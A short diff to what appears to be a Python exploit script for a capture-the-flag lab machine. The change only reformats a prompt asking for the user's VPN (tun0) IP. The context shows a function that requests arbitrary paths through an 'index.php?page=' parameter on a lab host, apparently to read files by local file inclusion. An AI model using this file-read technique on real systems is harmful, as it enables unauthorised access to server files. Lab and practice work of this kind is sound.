@@ -12,7 +12,7 @@ def kill(sig, frame):
 
 signal.signal(signal.SIGINT, kill)
 
-inip = input("\n[\033[1;34m*\033[1;37m] Introduce tu ip (tun0): ")
+inip = input("[\033[1;34m*\033[1;37m] Introduce tu ip (tun0): ")
 
 def file(path):
     request = requests.get(f"http://10.10.11.154/index.php?page={path}", allow_redirects=False)
